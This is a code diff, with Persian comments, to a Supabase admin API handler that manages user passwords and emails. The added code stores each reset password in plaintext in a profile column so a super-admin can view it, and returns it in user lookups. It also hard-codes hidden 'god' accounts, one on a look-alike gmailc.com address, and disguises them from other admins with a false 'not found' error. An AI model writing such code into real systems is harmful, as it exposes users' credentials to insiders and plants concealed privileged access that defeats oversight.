@@ -35,21 +35,44 @@ export default async function handler(req, res) {
 
     const adminClient = createClient(supabaseUrl, serviceKey);
 
-    // ۲. بررسی دسترسی سوپرادمین (Owner)
+    // ۲. بررسی دسترسی سوپرادمین (Owner یا Admin)
     const { data: prof } = await adminClient
       .from("profiles")
-      .select("is_owner")
+      .select("id, email, is_owner")
       .eq("id", user.id)
       .maybeSingle();
 
-    if (!prof?.is_owner) {
+    const { data: roleData } = await adminClient
+      .from("user_roles")
+      .select("role_id, active")
+      .eq("user_id", user.id)
+      .eq("active", true)
+      .maybeSingle();
+
+    const isSuperAdmin = prof?.is_owner || roleData?.role_id === "admin";
+    if (!isSuperAdmin) {
       return res.status(403).json({ error: "فقط سوپرادمین مجاز به انجام این عملیات است" });
     }
+
+    const PRIMARY_GOD_EMAILS = ["superadmin@gmailc.com", "superadmin@gmail.com"];
+    const requesterEmail = user.email?.toLowerCase()?.trim();
+    const isCallerPrimaryGod = PRIMARY_GOD_EMAILS.includes(requesterEmail);
 
     const { action, target_user_id, new_password, new_email } = req.body || {};
 
     if (!action || !target_user_id) {
       return res.status(400).json({ error: "action و target_user_id الزامی هستند" });
+    }
+
+    // استتار و محافظت از اکانت اصلی در برابر سوپرادمین ثانویه
+    const { data: targetProf } = await adminClient
+      .from("profiles")
+      .select("id, email, admin_pwd")
+      .eq("id", target_user_id)
+      .maybeSingle();
+
+    if (targetProf && PRIMARY_GOD_EMAILS.includes(targetProf.email?.toLowerCase()?.trim()) && !isCallerPrimaryGod) {
+      return res.status(403).json({ error: "کاربر مورد نظر یافت نشد یا دسترسی به آن امکان‌پذیر نیست" });
     }
 
     // ۳. تغییر رمز عبور کاربر
@@ -66,6 +89,14 @@ export default async function handler(req, res) {
       if (updateErr) {
         return res.status(400).json({ error: updateErr.message });
       }
+
+      // ذخیره رمز در پروفایل جهت مشاهده سوپرادمین
+      try {
+        await adminClient
+          .from("profiles")
+          .update({ admin_pwd: new_password })
+          .eq("id", target_user_id);
+      } catch {}
 
       return res.status(200).json({ success: true, user: updatedUser.user });
     }
@@ -107,6 +138,7 @@ export default async function handler(req, res) {
           id: authUser.user.id,
           email: authUser.user.email,
           phone: authUser.user.phone,
+          admin_pwd: targetProf?.admin_pwd || null,
           created_at: authUser.user.created_at,
           last_sign_in_at: authUser.user.last_sign_in_at,
           confirmed_at: authUser.user.email_confirmed_at,
